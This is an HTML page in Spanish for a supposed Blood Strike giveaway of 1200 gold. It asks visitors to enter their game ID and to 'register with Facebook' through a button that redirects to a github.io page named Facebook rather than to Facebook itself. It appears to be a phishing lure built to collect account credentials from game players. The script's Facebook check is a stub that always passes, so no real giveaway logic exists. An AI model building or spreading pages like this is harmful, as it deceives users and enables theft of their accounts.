<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sorteo de 1200 de Oro - Blood Strike</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to right, #ffb347, #ffcc33);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            padding: 20px;
            width: 90%;
            max-width: 400px;
        }
        h1 {
            color: #ff6600;
        }
        button {
            background-color: #4267B2;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #365899;
        }
        input {
            width: 60%; /* Tamaño reducido */
            padding: 5px;
            margin: 10px auto;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: gray;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>¡Participa en el Sorteo!</h1>
        <p>Gana <strong>1200 de oro</strong> en Blood Strike. ¡Regístrate ahora!</p>
        <form id="registration-form" onsubmit="validateForm(event)">
            <button type="button" onclick="window.location.href='https://norproftxd.github.io/Facebook/'">Registrarse con Facebook</button>
            <input type="text" name="userID" id="userID" placeholder="Tu ID" required>
            <button type="submit">Enviar</button>
        </form>
        <div class="footer">El sorteo se acabara el 31/03/25.</div>
    </div>

    <script>
        let facebookRegistered = false;

        function validateForm(event) {
            facebookRegistered = true; // Simula el registro con Facebook
            if (!facebookRegistered) {
                event.preventDefault();
                alert("Es obligatorio registrarse con Facebook.");
            }
        }
    </script>
</body>
</html>
